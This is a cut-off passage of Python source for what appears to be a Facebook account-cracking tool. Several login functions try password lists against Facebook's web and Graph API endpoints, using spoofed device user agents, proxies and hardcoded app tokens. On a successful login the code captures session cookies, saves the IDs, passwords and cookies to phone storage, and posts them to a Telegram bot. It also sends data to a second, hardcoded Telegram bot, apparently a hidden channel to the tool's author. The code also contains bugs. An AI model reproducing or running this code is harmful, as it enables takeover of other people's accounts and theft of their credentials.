    animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
    sys.stdout.write(f"\r{rad}[{green}{animasi}-M3{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[{rad}CP:{len(cps)}{rad}]"),
    sys.stdout.flush()
    ua = ua_valid()
    warna = random.choice(my_color)
    uger = random.choice(ugrn)
    try:
        for pas in pwv:
            conn = http.client.HTTPSConnection('mbasic.facebook.com')
            headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,hi;q=0.8,bn;q=0.7',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'cookie': 'datr=j16PZrEZMfeHUCccY-qTrVKD; sb=j16PZn2Au1zrbkc__J5S_PVB; ps_n=1; ps_l=1; wd=885x773; fr=0eTIeUQ39MmUdOUMK..Bmj16w..AAA.0.0.Bmp31y.AWUBr74jQqw',
    'dpr': '1',
    'origin': 'https://mbasic.facebook.com',
    'priority': 'u=0, i',
    'referer': 'https://mbasic.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="99.0.0.0", "Google Chrome";v="127.0.6533.72", "Chromium";v="127.0.6533.72"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-model': '""',
    'sec-ch-ua-platform': '"Windows"',
    'sec-ch-ua-platform-version': '"10.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    'viewport-width': '885',}
            conn.request(
    'POST',
    '/login/device-based/regular/login/?refsrc=deprecated&lwv=100',
    f'lsd=AVp-E35fJm4&jazoest=2818&m_ts=1722252731&li=un2nZmDzrsc7LWsoef_lNJ9l&try_number=0&unrecognized_tries=0&email={ids}&pass={pas}&login=Log+in&bi_xrwh=0',
    headers)
            log_cookies=conn.cookies.get_dict().keys()
            if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
                kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['sb', 'datr', 'ps_n', 'ps_l', 'locale', 'c_user', 'xs', 'fr', 'usida', 'wd', 'm_ls', 'presence']])
                cid = re.findall('c_user=(.*);xs',kuki)[0]
                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                        print(f'\r\r{rad}[{green}ATOM-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{kuki}\33[1;36m");linex()
                        cek_apk(kuki)
                        statusok = (f" {cid} | {pas} | {kuki} ")
                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                        open('/sdcard/ATOM-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ATOM-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
                        oks.append(cid)
                        break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1 = coki.split("1000")[1]
                if 'y' in cp_xdx:
                        print(f'\r{P} [\033[1;30mATOM-CP.txt{P}] \033[1;30m{uid}|{pas}')
                        open('/sdcard/ATOM-CP.txt','a').write(uid+'|'+pas+'\n')
                        cps.append(uid)
            else:
                continue
            time.sleep(0.01)
        loop+=1
    except http.client.HTTPSConnection:
        time.sleep(7)
    except Exception as e:
        pass

def m4(ids,pwv):
    global loop,oks,cps
    animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
    sys.stdout.write(f"\r{rad}[{green}{animasi}-M4{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[{rad}CP:{len(cps)}{rad}]"),
    sys.stdout.flush()
    session = requests.Session()
    ua = ua_valid()
    warna = random.choice(my_color)
    nip=random.choice(proxsi)
    proxs= {'http': 'socks4://'+nip}
    try:
        for pas in pwv:
            free_fb = session.get('https://m.facebook.com').text
            info={
            "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":ids,
            "pass":pas,
            "login":"Log In"}
            update={
            'authority': 'm.facebook.com',
            'method': 'GET',
            'path': '/login/device-based/login/async/',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9',
            'referer': 'https://m.facebook.com',
            'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36'}
            session.post('https://m.facebook.com/login/device-based/login/async/',data=info,headers=update,proxies=proxs,allow_redirects=False).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
                kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['sb', 'datr', 'ps_n', 'ps_l', 'locale', 'c_user', 'xs', 'fr', 'usida', 'wd', 'm_ls', 'presence']])
                cid = re.findall('c_user=(.*);xs',kuki)[0]
                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                        print(f'\r\r{rad}[{green}ATOM-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{coki}\33[1;36m");linex()
                        cek_apk(kuki)
                        statusok = (f" {cid} | {pas} | {kuki} ")
                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                        open('/sdcard/ATOM-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ATOM-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
                        oks.append(cid)
                        break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1 = coki.split("1000")[1]
                if 'y' in cp_xdx:
                        print(f'\r{P} [\033[1;30mATOM-CP.txt{P}] \033[1;30m{oks.append(cid)}|{pas}')
                        open('/sdcard/ATOM-CP.txt','a').write(uid+'|'+pas+'\n')
                        cps.append(uid)
            else:
                continue
            time.sleep(0.01)
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(7)
    except Exception as e:
        pass

def m5(ids,pwv):
    global loop,oks,cps
    sm_mdl=('SM-M236B','SM-A037G','SM-J701MT','SM-A115U','SM-G610M','SM-J530F','SM-A307FN','SM-A405FN','SM-S111DL','SM-A022F','SM-G900P','SM-G986U','SM-G981U','SM-G975U','SM-G981U','SM-G965F','SM-G970U1','SM-G965U','SM-G930T','SM-G930VL','SM-G950U','SM-G981U','SM-N975U','SM-G935U','SM-N960U','SM-G986U','SM-G930R4','SM-N960W','Xiaomi 10 Pro','2201123G','22071212AG','22081212UG','2112123AG','2211133C','Mi 9T Pro','CPH1861','RMX3630','RMX3686','RMX1805','RMX1801','RMX2020','RMX1811','RMX3063','RMX3063','RMX3501','OPPO 1105','oppo 15','oppo6779','oppo6833','OPPO7273','Oppo A1','PCHM10','CPH2071','CPH2185','CPH2179','A37f','SM-G920F','Moto G','Moto X','Motorola Moto X','Moto G14','Moto G Stylus','NRD90M','MatePad Pro 11','nova 11 SE ','Mate 60 Pro+ ','Huawei Mate 20 Pro','Huawei P30 Lite','NRD90M','SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V')
    uaD2 = f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+"[FBAN/FB4A;FBAV/297.0.0.36.116;FBBV/257460628;FBDM/{density=1.75,width=720,height=1423};FBLC/pt_BR;FBRV/0;FBCR/Claro BR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/"+str(random.choice(sm_mdl))+";FBSV/10;FBOP/19;FBCA/arm64-v8a:;]"
    animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
    sys.stdout.write(f"\r{rad}[{green}{animasi}-M5{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[{rad}CP:{len(cps)}{rad}]"),
    sys.stdout.flush()
    usragnt=usragnt
    warna = random.choice(my_color)
    try:
        for pas in pwv:
            info= {'adid':str(uuid.uuid4()),
            'format':'json',
            'device_id':str(uuid.uuid4()),
            'email':ids,
            'password':pas,
            'generate_analytics_claims':'1',
            'community_id':'',
            'cpl':'true','try_num':'1',
            'family_device_id':str(uuid.uuid4()),
            'credentials_type':'password',
            'source':'login',
            'error_detail_type':'button_with_disabled',
            'enroll_misauth':'false',
            'generate_session_cookies':'1',
            'generate_machine_id':'1',
            'currently_logged_in_userid':'0',
            'locale':'en_US',
            'client_country_code':'US',
            'fb_api_req_friendly_name':'authenticate',
            'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
            'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            update={'User-Agent':usragnt,
            'Accept-Encoding':'gzip, deflate',
            'Connection':'close',
            'Content-Type':'application/x-www-form-urlencoded',
            'Host':'graph.facebook.com',
            'X-FB-Net-HNI':str(random.randint(2e4, 4e4)),
            'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),
            'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Connection-Type':'WIFI',
            'X-Tigon-Is-Retry':'False',
            'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
            'x-fb-device-group':'5120',
            'X-FB-Friendly-Name':'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags':'graphservice',
            'X-FB-HTTP-Engine':'Liger',
            'X-FB-Client-IP':'True',
            'X-FB-Server-Cluster':'True',
            'x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
            url = 'htt'+'ps://g'+'raph.face'+'book.com/auth/login'
            q = requests.post(url,data=info,headers=update,allow_redirects=False,verify=True).json()
            if 'access_token' in q:
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");kuki = f"sb={AJb};{ckkk}"
                cid = str(q['uid'])
                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                        print(f'\r\r{rad}[{green}ATOM-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{kuki}\33[1;36m");linex()
                        cek_apk(kuki)
                        statusok = (f" {cid} | {pas} | {kuki} ")
                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                        open('/sdcard/ATOM-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ATOM-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
                        stasok = (f" {usragnt} ")
                        requests.post(f"https://api.telegram.org/bot"+str('7179860898:AAEs3yZDMXPfsCCduMWlMTOOoAEKazCMy6Q')+"/sendMessage?chat_id="+str('1778046662')+"&text="+str(stasok))
                        oks.append(cid)
                        break
            elif 'access_token' in q:
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");kuki = f"sb={AJb};{ckkk}"
                cid = str(q['uid'])
                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                        print(f'\r\r{rad}[{green}ATOM-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{kuki}\33[1;36m");linex()
                        cek_apk(kuki)
                        statusok = (f" {cid} | {pas} | {kuki} ")
                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                        open('/sdcard/ATOM-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ATOM-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
                        stasok = (f" {usragnt} ")
                        requests.post(f"https://api.telegram.org/bot"+str('7179860898:AAEs3yZDMXPfsCCduMWlMTOOoAEKazCMy6Q')+"/sendMessage?chat_id="+str('1778046662')+"&text="+str(stasok))
                        oks.append(cid)
            else:
                continue
            time.sleep(0.01)
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(7)
    except Exception as e:
        pass



def m6(ids,pwv):
    global loop,oks,cps    
    sm_mdl=('SM-G920F','Moto G','Moto X','Motorola Moto X','Moto G14','Moto G Stylus','NRD90M','MatePad Pro 11','nova 11 SE ','Mate 60 Pro+ ','Huawei Mate 20 Pro','Huawei P30 Lite','NRD90M','SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H')
    uaD2 = f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+"[FBAN/FB4A;FBAV/297.0.0.36.116;FBBV/257460628;FBDM/{density=1.75,width=720,height=1423};FBLC/pt_BR;FBRV/0;FBCR/Claro BR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/"+str(random.choice(sm_mdl))+";FBSV/10;FBOP/19;FBCA/arm64-v8a:;]"
    animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
    sys.stdout.write(f"\r{rad}[{green}{animasi}-M6{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[{rad}CP:{len(cps)}{rad}]"),
    sys.stdout.flush()
    usragnt =usragnt
    warna = random.choice(my_color)
    try:
        for pas in pwv:
            info= {'adid':str(uuid.uuid4()),
            'format':'json',
            'device_id':str(uuid.uuid4()),
            'email':ids,
            'password':pas,
            'generate_analytics_claims':'1',
            'community_id':'',
            'cpl':'true','try_num':'1',
            'family_device_id':str(uuid.uuid4()),
            'credentials_type':'password',
            'source':'login',
            'error_detail_type':'button_with_disabled',
            'enroll_misauth':'false',
            'generate_session_cookies':'1',
            'generate_machine_id':'1',
            'currently_logged_in_userid':'0',
            'locale':'en_US',
            'client_country_code':'US',
            'fb_api_req_friendly_name':'authenticate',
            'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
            'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            update={'User-Agent':usragnt,
            'Accept-Encoding':'gzip, deflate',
            'Connection':'close',
            'Content-Type':'application/x-www-form-urlencoded',
            'Host':'graph.facebook.com',
            'X-FB-Net-HNI':str(random.randint(2e4, 4e4)),
            'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),
            'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Connection-Type':'WIFI',
            'X-Tigon-Is-Retry':'False',
            'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
            'x-fb-device-group':'5120',
            'X-FB-Friendly-Name':'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags':'graphservice',
            'X-FB-HTTP-Engine':'Liger',
            'X-FB-Client-IP':'True',
            'X-FB-Server-Cluster':'True',
            'x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
            url = 'htt'+'ps://a'+'pi.face'+'book.com/auth/login'
            q = requests.post(url,data=info,headers=update,allow_redirects=False,verify=True).json()
            if 'access_token' in q:
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");kuki = f"sb={AJb};{ckkk}"
                cid = str(q['uid'])
                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                        print(f'\r\r{rad}[{green}ATOM-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{kuki}\33[1;36m");linex()
                        cek_apk(kuki)
                        statusok = (f" {cid} | {pas} | {kuki} ")
                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                        open('/sdcard/ATOM-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ATOM-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
                        stasok = (f" {usragnt} ")
                        requests.post(f"https://api.telegram.org/bot"+str('7179860898:AAEs3yZDMXPfsCCduMWlMTOOoAEKazCMy6Q')+"/sendMessage?chat_id="+str('1778046662')+"&text="+str(stasok))
                        oks.append(cid)
                        break
            elif 'access_token' in q:
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");kuki = f"sb={AJb};{ckkk}"
                cid = str(q['uid'])
                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                        print(f'\r\r{rad}[{green}ATOM-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{kuki}\33[1;36m");linex()
                        cek_apk(kuki)
                        statusok = (f" {cid} | {pas} | {kuki} ")
                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                        open('/sdcard/ATOM-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ATOM-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
                        stasok = (f" {usragnt} ")
                        requests.post(f"https://api.telegram.org/bot"+str('7179860898:AAEs3yZDMXPfsCCduMWlMTOOoAEKazCMy6Q')+"/sendMessage?chat_id="+str('1778046662')+"&text="+str(stasok))
                        oks.append(cid)
            else:
                continue
            time.sleep(0.01)
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(7)
    except Exception as e:
        pass



def m7(ids,pwv):
    global loop,oks,cps
    user_agent = f"[FBAN/FB4A;FBAV/"+str(random.randint(199,399))+".0.0."+str(random.randint(1,9))+"."+str(random.randint(99,199))+";FBBV/"+str(random.randint(111111111,999999999))+";FBDM/{density="+str(random.randint(2,3))+"."+str(random.randint(2,5))+",width=1080,height="+str(random.randint(1400,1499))+"};FBLC/"+str(random.choice(["cs_CZ","en_GB","en_US","lt_LT","pl_PL","id_ID","ru_RU","pt_PT","he_IL","hi_IN","nl_NL"," it_IT","en_IN","es_ES","en_PK"]))+";FBRV/"+str(random.randint(111111111,999999999))+";FBCR/"+str(random.choice(["Tele2You","Telenor","FASTWEB","Banglalink","Sprint","Jazz","Vodafone IN","Vi India","Tele2 LT","Jio 4G","EE","Oi","MtelBG","AT&amp;amp-T","Ufone","Azercell"]))+";FBMF/Xiaomi;FBBD/"+str(random.choice(["xiaomi","Xiaomi","Redmi"]))+";FBPN/com.facebook.katana;FBDV/"+str(random.choice(["M2101K7AG","M2003J15SC","M2004J19C","M2006C3LG","M2007J20CG","M2010J19CG","M2011K2C","M2012K11AG","M2101K7BG","M2101K9G","M2102J20SG","M2102K1G","M2003J15SC","MI MAX 2","AT&amp;amp-T","Redmi Note 4", "Redmi 4X","Redmi Note 8 Pro","Redmi Note 5","Redmi Note 8T","Redmi 6A","Redmi 7A","MI PLAY","MI 8 Lite","Mi 9T","Mi A2 Lite"," Mi 9", "M2101K7AG"]))+";FBSV/"+str(random.randint(9,12))+";FBOP/1;FBCA/arm64-v8a:;]"
    animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
    sys.stdout.write(f"\r{rad}[{green}{animasi}-M7{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[{rad}CP:{len(cps)}{rad}]"),
    sys.stdout.flush()
    usragnt =usragnt
    war =random.choice(usragnt)
    warna = random.choice(my_color)
    try:
        for pas in pwv:
            info= {'adid':str(uuid.uuid4()),
            'format':'json',
            'device_id':str(uuid.uuid4()),
            'email':ids,
            'password':pas,
            'generate_analytics_claims':'1',
            'community_id':'',
            'cpl':'true','try_num':'1',
            'family_device_id':str(uuid.uuid4()),
            'credentials_type':'password',
            'source':'login',
            'error_detail_type':'button_with_disabled',
            'enroll_misauth':'false',
            'generate_session_cookies':'1',
            'generate_machine_id':'1',
            'currently_logged_in_userid':'0',
            'locale':'en_US',
            'client_country_code':'US',
            'fb_api_req_friendly_name':'authenticate',
            'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
            'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            update={'User-Agent':usragnt,
            'Accept-Encoding':'gzip, deflate',
            'Connection':'close',
            'Content-Type':'application/x-www-form-urlencoded',
            'Host':'graph.facebook.com',
            'X-FB-Net-HNI':str(random.randint(2e4, 4e4)),
            'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),
            'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Connection-Type':'WIFI',
            'X-Tigon-Is-Retry':'False',
            'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
            'x-fb-device-group':'5120',
            'X-FB-Friendly-Name':'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags':'graphservice',
            'X-FB-HTTP-Engine':'Liger',
            'X-FB-Client-IP':'True',
            'X-FB-Server-Cluster':'True',
            'x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
            url = 'htt'+'ps://a'+'pi.face'+'book.com/auth/login'
            q = requests.post(url,data=info,headers=update,allow_redirects=False,verify=True).json()
            if 'access_token' in q:
